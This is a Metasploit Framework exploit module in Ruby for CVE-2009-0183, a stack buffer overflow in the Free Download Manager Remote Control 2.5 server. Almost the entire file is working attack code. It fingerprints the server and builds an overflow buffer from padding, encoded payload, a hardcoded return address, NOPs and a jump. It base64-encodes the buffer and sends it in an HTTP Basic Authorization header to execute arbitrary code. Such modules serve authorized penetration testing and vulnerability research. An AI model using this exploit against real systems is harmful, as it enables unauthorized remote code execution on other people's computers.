##
# $Id: fdm_auth_header.rb 9812 2010-07-13 22:11:40Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	# w/auth required: [*] x.x.x.x  ( 401-Basic realm="FDM Remote control server" )
	# w/o auth: <title>FDM remote control server</title>
	# w/o auth: <div align="right"><span class="style1"><span class="style4">Free Download Manager remote control server.</span><br />
	# <span class="style4">Version 1.0.</span>  </span></div>
	# Extra url: /compdlds.req
	HttpFingerprint = { :pattern => [ /(FDM Remote control server|Free Download Manager)/i ] } # XXX: A custom body check would be nice too

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Free Download Manager Remote Control Server Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Free Download Manager
				Remote Control 2.5 Build 758. When sending a specially crafted
				Authorization header, an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9812 $',
			'References'     =>
				[
					[ 'CVE', '2009-0183' ],
					[ 'OSVDB', '51745' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x0d\x0a",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Privileged'     => true,
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Free Download Manager 2.5 Build 758', { 'Ret' => 0x0040ae0f } ], # fdmwi.exe
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 2 2009'))
	end

	def exploit

		sploit =  rand_text_alpha_upper(1012 - payload.encoded.length) + payload.encoded
		sploit << [target.ret].pack('V') + make_nops(4) + [0xe8, -575].pack('CV')
		sploit = Rex::Text.encode_base64(sploit)

		print_status("Trying target #{target.name}...")

		send_request_raw(
			{
				'headers' => { 'Authorization' => "Basic #{sploit}" }
			}, 2)

		handler
		disconnect

	end

end